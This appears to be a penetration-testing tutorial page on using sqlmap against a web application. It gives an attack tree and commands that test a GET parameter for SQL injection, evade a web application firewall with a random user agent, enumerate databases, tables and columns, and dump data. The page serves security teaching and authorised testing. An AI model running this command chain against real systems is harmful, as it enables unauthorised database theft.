#  Scanning a webserver with SQLMap

## Attack tree 

```text
1 Gather information with sqlmap
    1.1 Find a page url with a GET request parameter (AND)
    1.2 Test different SQL injection methods against the request parameter (AND)
    1.3 List information about the existing databases (AND)
    1.4 List information about tables present in a particular database (AND)
    1.5 List information about the columns of a particular table (AND)
    1.6 Dump the data
```

## Examples

Identify a page in the target web application that displays data and note the URL.
Use a standard HTTP GET based request against a URI with a request parameter (?id=1). This will test different SQL 
injection methods against the id parameter.
    
    # sqlmap -u http://urloftargetpage/page.php?id=1

When blocked by a Web Application Firewall (WAF), try using a different user agent with the `--randomagent` parameter.

    # sqlmap -u http://urloftargetpage/page.php?id=1 --random-agent

If SQL injections are successful, the `--dbs` parameter gives information about the database, such as the 
type of database and the database name.

    sqlmap -u http://urloftargetpage/page.php?id=1 --dbs

List information about tables present in a particular database:

    # sqlmap -u http://urloftargetpage/page.php?id=1 -D <databasename> --tables

List information about the columns of a particular table:

    # sqlmap -u http://urloftargetpage/page.php?id=1 -D <databasename> -T <tablenname> --columns

Dump data:

    # sqlmap -u http://urloftargetpage/page.php?id=1 -D <databasename> -T <tablename> -C <multiple columnnames separated by commas>--dump

## Tools
* [SQLMap](https://www.kali.org/tools/sqlmap/)
* [SQLMap wiki](https://github.com/sqlmapproject/sqlmap/wiki/Introduction)
* [Burp suite CE proxy](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic)

## Cheatsheets
* [SQLMap cheatsheet](cheatsheets:docs/databases/sqlmap-cheatsheet)